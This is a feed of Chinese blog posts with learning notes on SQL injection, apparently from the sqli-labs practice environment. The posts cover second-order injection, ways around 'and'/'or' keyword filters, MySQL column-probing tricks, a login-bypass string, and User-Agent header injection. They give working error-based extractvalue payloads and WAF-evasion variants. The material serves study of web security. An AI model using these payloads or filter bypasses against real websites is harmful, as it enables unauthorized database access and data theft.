        <content type="html"><![CDATA[<p>大佬博文(看着这个就够了，我的不用看了，我只是自己总结一下。)</p><p><a href="https://www.jianshu.com/p/746164a91422">二次注入</a></p><p>原理：二次排序注入，也称存储型注入。即：先将导致 SQL注入的字符预先存到数据库中,当再次调用到这个恶意构造的字符时就可以触发注入。</p><p>利用了 waf等对存入数据库的东西不进行过滤，只进行转义的特点，存到数据库中之后还是你输入的原数据，然后在第二次用到该数据的时候，它与操作它的sql 语句形成 sql 注入</p><p>这里涉及到用户体验/功能等问题，比如：你写一篇正常的关于 sql注入或其他涉及 sql 的博文，文章中包含 sql注入等语句，然后你要存入数据库，waf 等不应该将威胁字符、字符串等给去掉.这可能也是安全与功能体验的一个矛盾点吧。</p><p>在本关中，其主要功能的有 3 个 php 文件: login.php负责查询数据库用户存在和验证登录, login_create.php 创建新用户,pass_change.php 修改老用户密码。</p><p>本次的过滤在账户登录和密码处,使用了 mysql_real_escape_string 函数</p><p>mysql_real_escape_string() 函数<strong>转义</strong> SQL语句中使用的字符串中的特殊字符，但并不会替换或去除。</p><p>因此，我们输入的特殊字符会被它转义而不奏效,但是之后存储进数据库时依然会还原成原来的样子。</p><p>此外，我们发现 pass_change.php 中直接把 session中的用户名直接拿来用了,结合上面的过滤函数,如果知道确切的用户,可以构造单引号闭合来修改其密码。</p><p>有些开发者过于轻心大意，当将从数据库中取出的数据拼接到 sql语句上时，不进行检测过滤，从而导致二次注入。</p><p>具体细节就不讲了，看大佬博文吧。以后遇到别的再加上来。</p>]]></content>
      
      
      <categories>
          
          <category> websec </category>
          
          <category> sql injection </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>绕过and与or过滤</title>
      <link href="/blog/2019/08/04/websec/sql_injection/and_or_filter/"/>
      <url>/blog/2019/08/04/websec/sql_injection/and_or_filter/</url>
      
        <content type="html"><![CDATA[<h1 id="绕过方式">绕过方式</h1><p>以下绕过方式基本按照实用程度（好用程度）排序</p><h2 id="or-绕过方式">or 绕过方式</h2><h3 id="符号绕过">符号绕过：||</h3><p>注意：|| 直接使用就行，它不属于 url 中需要被转移的那种。</p><p>符号可以绕过的原因是 waf 一般只检测 and 和 or的单词关键字，不检测对应数学符号。当然，要是 waf过滤了它们，这种绕过也就不管用了，比如：本关可以在 blacklist中加入以下代码，便过滤了&amp; 和 |</p><pre><code>$id= preg_replace(&#39;/\\|/&#39;,&quot;&quot;, $id);$id= preg_replace(&#39;/\\&amp;/&#39;,&quot;&quot;, $id);</code></pre><h3 id="双字符绕过oorr">双字符绕过：oorr</h3><p>一次过滤，检测到中间的 or，去掉它，然后还剩下 o 和 r，正好组成一个or，所以可以绕过。双字符应用了开发人员只进行一次过滤而不循环过滤的过失，当然，如果开发人员进行循环过滤，那么这种绕过方式就不管用了。</p><p>比如：本关的源码，就只是用一次过滤。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">blacklist</span>(<span class="variable">$id</span>);</span><br><span class="line"><span class="comment">//中间省略好多行</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/AND/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="大小写变形ororor">大小写变形：Or,Or,or</h3><p>一般用来绕过那些只检测 and 和or，而不检测别的大小写形式（即：使用正则时，没有用 i选项，忽略大小写进行匹配），当然，如果开发者使用正则时加了 i选项，那这种绕过方式就失效了。这种方法不太管用（因为好多 waf都不缺分大小写。）</p><h2 id="and-绕过方式">and 绕过方式</h2><h3 id="双字符anandd">双字符：anandd</h3><h3 id="符号绕过-1">符号绕过:&amp;&amp;</h3><p>注意：&amp;&amp; 不能直接使用，需要对他进行 url 编码，因为 &amp;在url 中有特殊用法：连接 get 请求的键值对。所以，就像 # 一样，在 url 中 #号是用来指导浏览器动作的（例如锚点），所以使用它的时候也要进行 url编码</p><h3 id="大小写-andand等">大小写 aNd,AND,等</h3><h1 id="关键步骤">关键步骤</h1><h2 id="检测注入点">检测注入点</h2><p>加个单引号，回显如下：</p><blockquote><p><strong>Warning</strong>: mysql_fetch_array() expects parameter 1 tobe resource, boolean given in <strong>C:-labs.php</strong> on line<strong>39</strong> You have an error in your SQL syntax; check themanual that corresponds to your MySQL server version for the rightsyntax to use near ''1'' LIMIT 0,1' at line 1</p></blockquote><p>嗯，有语句报错，真好。根据 '1'' LIMIT0,1，我们得知，单引号包裹，后面有语句。</p><p>尝试加个注释，嗯，加了之后，不报错了，证明没有过滤注释。</p><h2 id="猜字段">猜字段</h2><p>?id=1' order by 3--+</p><p>报错：</p><blockquote><p>You have an error in your SQL syntax; check the manual thatcorresponds to your MySQL server version for the right syntax to usenear 'der by 3-- ' LIMIT 0,1' at line 1</p></blockquote><p>可以看出 or 被过滤了（or 和 and往往一起，开发人员想到过滤其一，就会想到另一个。因此，我们有理由相信 and也被过滤了。）。</p><p>这里采用双字符，因为过滤 or，却影响到了 order by 中的or，这是不怎么好的过滤（我认为），当然，还有其他一些类似的情况，比如：information中的 or</p><p>?id=1' oorrder by 2 --+ 不报错，显示正常，绕过成功。</p><p>后面使用 union 查询注入就行了。</p><h1 id="报错注入">报错注入</h1><p>下面使用报错注入对 and/or 过滤注入进行进一步讲解。</p><p>双字符绕过：</p><p>?id=-1' oorr extractvalue(1,concat(0x23,(select schema_name frominfoorrmation_schema.schemata limit 0,1))) --+</p><p>这里注意：information 中的 or 也要双字符。</p><p>?id=-1' anandd extractvalue(1,concat(0x23,concat(version())))--+</p><p>符号绕过：</p><p>?id=-1' || extractvalue(1,concat(0x23,concat(version())))--+</p><p>?id=-1' %26%26 extractvalue(1,concat(0x23,concat(version())))--+</p><p>注意：&amp;&amp;要使用 url 编码</p>]]></content>
      
      
      <categories>
          
          <category> websec </category>
          
          <category> sql injection </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>mysql注入小技巧</title>
      <link href="/blog/2019/08/04/websec/sql_injection/mysql-injection-skills/"/>
      <url>/blog/2019/08/04/websec/sql_injection/mysql-injection-skills/</url>
      
        <content type="html"><![CDATA[<h1 id="判断当前表中是否有某个字段">判断当前表中是否有某个字段</h1><p>假设后台语句为：select * from tuser where id=1</p><p>假设我们要判断有没有 flag 字段，我们可以构造 payload：?id=1or(flag)</p><p>通过报错与否来判断有无该字段。</p><p>原理）（我自己测试出来的..）：where 后面可以直接加字段名，在判断where 条件时，mysql 会对每条数据的该字段进行 atof/atod函数操作（但实际的数据不变，只是这样判断），即：将其转换为浮点型，然后通过判断该字段是否为0，若非零，则满足条件。</p><p>给出测试证明：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from tuser;</span><br><span class="line">+------+----------+----------+</span><br><span class="line">| id   | username | passwd   |</span><br><span class="line">+------+----------+----------+</span><br><span class="line">|    1 | admin    | basswd   |</span><br><span class="line">|    1 | adam     | vassword |</span><br><span class="line">|    1 | bob      | gasswd   |</span><br><span class="line">|    2 | colin    | passwd   |</span><br><span class="line">|    2 | doc      | passwd   |</span><br><span class="line">|    3 | doctor   | passwd   |</span><br><span class="line">|    3 | elite    | passwd   |</span><br><span class="line">|    1 | NULL     | passw    |</span><br><span class="line">|    1 | admin    | basswd   |</span><br><span class="line">|    1 | adam     | vassword |</span><br><span class="line">|    1 | bob      | gasswd   |</span><br><span class="line">|    2 | colin    | passwd   |</span><br><span class="line">|    1 | 0        | pass     |</span><br><span class="line">|    1 |          | pas      |</span><br><span class="line">|    1 |  dewe    | ds       |</span><br><span class="line">|    1 |  3fd     | asd      |</span><br><span class="line">+------+----------+----------+</span><br><span class="line">16 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from tuser where username;</span><br><span class="line">+------+----------+--------+</span><br><span class="line">| id   | username | passwd |</span><br><span class="line">+------+----------+--------+</span><br><span class="line">|    1 |  3fd     | asd    |</span><br><span class="line">+------+----------+--------+</span><br><span class="line">1 row in set, 13 warnings (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from tuser where id</span><br><span class="line">    -&gt; ;</span><br><span class="line">+------+----------+----------+</span><br><span class="line">| id   | username | passwd   |</span><br><span class="line">+------+----------+----------+</span><br><span class="line">|    1 | admin    | basswd   |</span><br><span class="line">|    1 | adam     | vassword |</span><br><span class="line">|    1 | bob      | gasswd   |</span><br><span class="line">|    2 | colin    | passwd   |</span><br><span class="line">|    2 | doc      | passwd   |</span><br><span class="line">|    3 | doctor   | passwd   |</span><br><span class="line">|    3 | elite    | passwd   |</span><br><span class="line">|    1 | NULL     | passw    |</span><br><span class="line">|    1 | admin    | basswd   |</span><br><span class="line">|    1 | adam     | vassword |</span><br><span class="line">|    1 | bob      | gasswd   |</span><br><span class="line">|    2 | colin    | passwd   |</span><br><span class="line">|    1 | 0        | pass     |</span><br><span class="line">|    1 |          | pas      |</span><br><span class="line">|    1 |  dewe    | ds       |</span><br><span class="line">|    1 |  3fd     | asd      |</span><br><span class="line">+------+----------+----------+</span><br><span class="line">16 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from tuser where passwd;</span><br><span class="line">Empty set, 16 warnings (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; show warnings;</span><br><span class="line">+---------+------+-----------------------------------------------+</span><br><span class="line">| Level   | Code | Message                                       |</span><br><span class="line">+---------+------+-----------------------------------------------+</span><br><span class="line">| Warning | 1292 | Truncated incorrect INTEGER value: &#x27;basswd&#x27;   |</span><br><span class="line">| Warning | 1292 | Truncated incorrect INTEGER value: &#x27;vassword&#x27; |</span><br><span class="line">| Warning | 1292 | Truncated incorrect INTEGER value: &#x27;gasswd&#x27;   |</span><br><span class="line">| Warning | 1292 | Truncated incorrect INTEGER value: &#x27;passwd&#x27;   |</span><br><span class="line">| Warning | 1292 | Truncated incorrect INTEGER value: &#x27;passwd&#x27;   |</span><br><span class="line">| Warning | 1292 | Truncated incorrect INTEGER value: &#x27;passwd&#x27;   |</span><br><span class="line">| Warning | 1292 | Truncated incorrect INTEGER value: &#x27;passwd&#x27;   |</span><br><span class="line">| Warning | 1292 | Truncated incorrect INTEGER value: &#x27;passw&#x27;    |</span><br><span class="line">| Warning | 1292 | Truncated incorrect INTEGER value: &#x27;basswd&#x27;   |</span><br><span class="line">| Warning | 1292 | Truncated incorrect INTEGER value: &#x27;vassword&#x27; |</span><br><span class="line">| Warning | 1292 | Truncated incorrect INTEGER value: &#x27;gasswd&#x27;   |</span><br><span class="line">| Warning | 1292 | Truncated incorrect INTEGER value: &#x27;passwd&#x27;   |</span><br><span class="line">| Warning | 1292 | Truncated incorrect INTEGER value: &#x27;pass&#x27;     |</span><br><span class="line">| Warning | 1292 | Truncated incorrect INTEGER value: &#x27;pas&#x27;      |</span><br><span class="line">| Warning | 1292 | Truncated incorrect INTEGER value: &#x27;ds&#x27;       |</span><br><span class="line">| Warning | 1292 | Truncated incorrect INTEGER value: &#x27;asd&#x27;      |</span><br><span class="line">+---------+------+-----------------------------------------------+</span><br><span class="line">16 rows in set (0.00 sec)</span><br><span class="line">mysql&gt; select * from tuser where passwe</span><br><span class="line">    -&gt; ;</span><br><span class="line">ERROR 1054 (42S22): Unknown column &#x27;passwe&#x27; in &#x27;where clause&#x27;</span><br></pre></td></tr></table></figure><p>当然，如果自己构造的话，也可以在 information_schema里面判断有没有某库，某表等。</p><h1 id="limit-下的字段数判断">limit 下的字段数判断</h1><p>使用 where 条件时，我们可以使用 order by 判断字段数，而 limit后可以利用 <code>1,into @,@</code> （<span class="citation"data-cites="为字段数">@为字段数</span>）判断字段数</p><p>注：<span class="citation" data-cites="为">@为</span> mysql 的User-Defined Variables，即：用户定义变量，也就是我们可以使用 @ 在 mysql中定义变量，类似 php 中使用 $ 定义变量。</p><p>比如：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">set</span> <span class="variable">@var</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="variable">@var</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line"><span class="operator">|</span> <span class="variable">@var</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>下面展示 limit 0,1 猜字段数，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from tuser where id=1 limit 0,1 into @a,@b,@c;</span><br><span class="line">Query OK, 1 row affected (0.05 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from tuser where id=1 limit 0,1 into @a,@b;</span><br><span class="line">ERROR 1222 (21000): The used SELECT statements have a different number of columns</span><br><span class="line">mysql&gt; select @a;</span><br><span class="line">+------+</span><br><span class="line">| @a   |</span><br><span class="line">+------+</span><br><span class="line">|    1 |</span><br><span class="line">+------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>原理：</p><p>使用 select into 语句将查询的一条（注意：<span class="citation"data-cites="a">@a</span>，<span class="citation"data-cites="b">@b</span>，<span class="citation"data-cites="c">@c</span> 等只是一个变量，不能接受多条数据，所以 limit byx，1，第二个参数只能为1），前后字段数不一致，放不进去当然就报列数不一样的错误。</p><p>未完待续....</p>]]></content>
      
      
      <categories>
          
          <category> websec </category>
          
          <category> sql injection </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sql注入介绍</title>
      <link href="/blog/2019/08/02/websec/sql_injection/sql_jnjection_intro/"/>
      <url>/blog/2019/08/02/websec/sql_injection/sql_jnjection_intro/</url>
      
        <content type="html"><![CDATA[<p>2019 年 10 月 13 日修改少许</p><h2 id="引例之万能密码">引例之万能密码</h2><blockquote><p>用户名: admin' or '1 --</p><p>密码:</p></blockquote><p>原理：sql 注入（服务端漏洞）</p><h1 id="什么是-sql-注入">什么是 SQL 注入？</h1><p>SQL Injection 是一种常见的 Web安全漏洞,攻击者利用这个漏洞，可以访问或修改数据，或者利用潜在的数据库漏洞进行攻击。</p><ol type="1"><li><p>正常的 Web 端口访问</p><p>正常访问是 web出啊如程序设计者所希望的参数值，由程序查询数据库完成处理后，呈现结果页面给用户。</p></li><li><p>SQL 注入是如何访问？</p><p>1）SQL 注入也是正常的 web 端口访问</p><p>2）只是传入的参数值并非是程序设计者所期望的，而是传入了嵌套 SQL代码的参数值</p><p>3）参数值利用程序处理注入这的逻辑，按照注入者的期望执行数据库查询</p><p>4）甚至页面呈现按 SQL 注入者期望显示</p></li></ol><p>SQL 注入：是通过应用程序把带有 SQL 代码的参数传递给数据库</p><p>万能密码回顾：</p><p>登录请求通常使用 post 方式提交表单，服务器通过 PHP获取用户名与密码，然后拼接为 sql语句，然后从用户表中查询用户名[用户输入的用户名]，密码为[用户输入的密码的 MD5]（一般使用 MD5加密），执行成功，就返回用户名表示登陆成功。</p><p>而处理万能密码时，闭合、注释，使得只要数据库的对应表中存在该用户名时，便执行成功，登陆成功。</p><p>总结：</p><ol type="1"><li>获取用户请求参数</li><li>拼接到代码中（这个拼接过程很重要，正是这个过程处理不恰当，使得数据与代码的界限混淆）</li><li>SQL 语句按照我们构造参数的语义执行成功。</li></ol><h2 id="sql-注入的必备条件"><strong>SQL 注入的必备条件：</strong></h2><ol type="1"><li>可以控制输入的数据</li><li>服务器要执行的代码拼接了控制的数据</li></ol><h2 id="sql-注入的原因">SQL 注入的原因</h2><p>根本原因：</p><p>SQL注入是应用程序的问题，而不是系统或者数据库的问题。其本质是人对数据安全的意识薄弱或者即使有安全意识而程序员对如何防范无从下手。因此，导致程序没有对用户的输入数据的合法性进行检查，对传入参数的安全性没有恰当的过滤。</p><p>技术原因：</p><p>数据和代码未分离，即数据当做了代码来执行。（用一句<strong>不太严谨</strong>的话来说，当程序对客户端提交的数据未作处理或转义直接代入数据库就造成了SQL 注入）</p><p>解决方案：数据与查询模块独立处理。</p><h2 id="sql-注入的危害">SQL 注入的危害</h2><ol type="1"><li>获取数据库信息<ol type="1"><li>管理员后台用户名和密码</li><li>获取其他数据库敏感信息：用户名、密码等</li><li>脱库</li></ol></li><li>获取服务器权限</li><li>植入 Webshell，获取服务器后门（select into outfile 或 mysql 日志写webshell）</li><li>读取服务器敏感文件</li><li>万能密码</li></ol><p>感想：</p><p>目前，互联网上 sql注入也存在不少（不过，互联网毕竟都这么大。。），因为仍然有很多网站开发者，管理员等安全意识、安全开发技术不高等。但整体上，人们对于网络的安全意识已经提升了很多，相比以前，网络安全已经进了一大步。由于sql注入的一些特点：形式简单、危害大、好复现、好修复等，很多有些安全意识的，没能力的上乙方的WAF，有能力的自己研发安全产品，使得 sal注入比较少出现了。（在那些有安全意识的厂家）。但是，道高一尺，魔高一丈，很多WAF产品本身设计或过滤等就存在缺陷，基础的绕过不行，我们还有高级的绕过方式，所以说门槛高了，要学的多了。</p>]]></content>
      
      
      <categories>
          
          <category> websec </category>
          
          <category> sql injection </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>http头部注入</title>
      <link href="/blog/2019/07/30/websec/sql_injection/http_header_%20injection/"/>
      <url>/blog/2019/07/30/websec/sql_injection/http_header_%20injection/</url>
      
        <content type="html"><![CDATA[<h1 id="http-头部注入简介">http 头部注入简介</h1><p>根据常见性依次有：User-Agent、cookie、X-Forwarded-For、Client-IP、Referer、Host等。</p><p><a href="https://www.jianshu.com/p/792048d08ebc">X-Forwarded-For的一些理解</a></p><h2 id="http-头部详解">HTTP 头部详解</h2><p>User-Agent：使得服务器能够识别客户使用的操作系统，游览器版本等.（很多数据量大的网站中会记录客户使用的操作系统或浏览器版本等存入数据库中）</p><p>Cookie：网站为了辨别用户身份、进行 session跟踪而储存在用户本地终端上的数据（通常经过加密）.</p><p>X-Forwarded-For：简称 XFF 头，它代表客户端，也就是 HTTP的请求端真实的 IP,（通常一些网站的防注入功能会记录请求端真实 IP地址并写入数据库 or 某文件[通过修改 XXF 头可以实现伪造 IP]）.</p><p>Clien-IP：同上，不做过多介绍.</p><p>Rerferer：浏览器向 WEB 服务器表明自己是从哪个页面链接过来的.</p><p>Host：客户端指定自己想访问的 WEB 服务器的域名/IP 地址和端口号</p><h2 id="注入姿势">注入姿势</h2><p>首先介绍，我认为测试 http -header 头部的正确姿势</p><p>首先注册该网站账号（这里注意一般注册时用户名和密码不要是一样的，要有区分度。），先用正确的账号密码测试，因为据我观测：在登录（不管账号密码正确与否）时，都会有user-agent 与 referer（如果说的不对，还请大佬指教。），cookie初次登录成功之后才会有（所以测试 cookie是需要有一个账号密码的）当然，你要是测试 post注入什么的就没有必要注册账号了。这里是指 http header 注入。</p><p>下面介绍两种注入姿势：</p><p>哪种姿势适合你，你就选择哪种。</p><ol type="1"><li>使用 hackbar 在 post 数据处，输入正确的用户名和密码，并打开 hackbar中 user agent，通过查看 network 中的请求，复制自己的 useragent 标识，到hackbar 的 useragent 处，</li><li>使用 burp repeater 抓包，然后进行重放，值得一提的是，repeater 中的render 渲染功能还行，可以直接渲染出页面。</li></ol><p>注：本来用 hackbar 修改 referer 头，但是不管用，后来发现，hackbar没有改掉 referer，一个 bug（可能是由于 chrome某些改进的参数导致，注意当你感觉使用一个工具产生的结果与想的不一样的话，不妨试试别的工具。或者通过别的方式验证一下。），最后使用burp suite 吧。（下面的回显报错可以在 burp repeater 的报文或<strong>render 渲染里面看到</strong>，建议去 render看，因为有一些字符报文中显示不出来）。我们不是大神，不可能遇到一个问题，没有完美的工具就自己写一个工具。每种工具都有它的优缺点，我们要善于利用它的优点，避免它的缺点。在web 安全中有时干一件事情，需要用到几个工具，这是很正常的事情。</p><h1 id="user-agent-注入">user-agent 注入</h1><p><strong>我猜测</strong>：网站记录用户的 user-agent存入数据库（<strong>怎么存？当然是使用 insert语句啦，这是我们要知道的。</strong>），一方面是为了识别用户设备，另一方面，由于设备不同，可能会有不同的优化/处理吧。</p><p>下面熟悉的流程步骤又来了，现在就把 useragent 当成你 post注入时的输入框，流程大致一样。</p><h2 id="测试注入点">测试注入点</h2><p>在 useragent内容的后面测试单引号/双引号/单引号括号/双引号括号/单引号双括号/双引号双括号/等。 看页面变化及报错。</p><p>有的时候是直接报错语句，有的时候，返回 401Unauthorzed，具体看情况。</p><p>我的测试 payload：</p><blockquote><p>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/75.0.3770.142 Safari/537.36'</p></blockquote><p>回显：</p><blockquote><p>You have an error in your SQL syntax; check the manual thatcorresponds to your MySQL server version for the right syntax to usenear '192.168.107.1', 'admin')' at line 1</p></blockquote><p>注入点存在。</p><h2 id="判断注入类型">判断注入类型</h2><p>根据报错：192.168.107.1', 'admin')，这里猜测该网站通过将 user agent插入了数据库来验证身份（当然，目前据我所知就两种：一种是不存储，一种是insert 插入，报错了，肯定就是 insert 存储了呗）这里由于用户名与密码是一样的，不能区分，admin是啥，不过，在本例中也没关系（但是，别的情况可能就有关系了。账号密码还是不要相同的好）猜测大致 sql 查询语句：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into tbl_name <span class="title function_ invoke__">values</span>(<span class="variable">$useragent</span>,<span class="variable">$ip</span>,<span class="variable">$useraname</span>/<span class="variable">$password</span>);</span><br></pre></td></tr></table></figure><p>即：insert 语句、三个字段、字段用单引号包裹</p><h2 id="构造有效-payload">构造有效 payload</h2><p>这里不是 select 就别用什么 order by 了，也就没有显示位一说了。</p><p>对于 insert 语句注入的话，一般就是盲注了，报错、布尔、时间三种。</p><p>注：由于设备的 User-Agent 太长了，下面我用 Mozilla/5.0 代替全部User-Agent 内容，即：Mozilla/5.0 (Windows NT 10.0; Win64; x64)AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142Safari/537.36。这里想说 User-Agent的原始数据不要改吧，万一判断长度什么的，改短了再出别的事情了（总之，看你自己了。）</p><h3 id="测试报错注入">测试报错注入</h3><p>paylaod:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mozilla/<span class="number">5.0</span><span class="string">&#x27;, (select 1 and extractvalue(1,concat(0x23,(select version())))),(select 1))#</span></span><br></pre></td></tr></table></figure><p>当然，我一开始使用的注释是 -- ，但是不管用（php给我把空格去掉了，我在 mysql 执行该 payload生成的语句就可以），于是换成了 #</p><p>回显：XPATH syntax error: '#5.5.53'</p><p>测试成功，后面的步骤与方法你懂得。</p><p>学习了 mysql 注入天书对本节的注入流程后，我发现有另一种构造方式。</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and &#x27;1</span><br></pre></td></tr></table></figure><p>实际执行的语句为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`)</span><br><span class="line">VALUES (&#x27;&#x27;and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and &#x27;1&#x27;, &#x27;192.168.107.1&#x27;, &#x27;admin&#x27;)</span><br></pre></td></tr></table></figure><p>此 payload 以不改变其他字段内容为出发点，利用 and 连接布尔值，返回布尔值，而布尔值可以与 0 或 1进行自动转换的特点构造而成。（注：空串可以自动转化为 0 以及布尔值false）。</p><p>下面证实我的说法</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">insert</span> <span class="keyword">into</span> temp <span class="keyword">values</span>(<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>,<span class="string">&#x27;me&#x27;</span>,<span class="string">&#x27;pwd&#x27;</span>);</span><br><span class="line">Query OK, <span class="number">1</span> <span class="type">row</span> affected (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> temp;</span><br><span class="line"><span class="operator">+</span><span class="comment">------+-------+----------+</span></span><br><span class="line"><span class="operator">|</span> id   <span class="operator">|</span> uname <span class="operator">|</span> pass     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+-------+----------+</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> admin <span class="operator">|</span> pass     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">2</span> <span class="operator">|</span> <span class="keyword">user</span>  <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">3</span> <span class="operator">|</span> green <span class="operator">|</span> pwd      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> me    <span class="operator">|</span> pwd      <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+-------+----------+</span></span><br><span class="line"><span class="number">4</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">insert</span> <span class="keyword">into</span> temp <span class="keyword">values</span>(<span 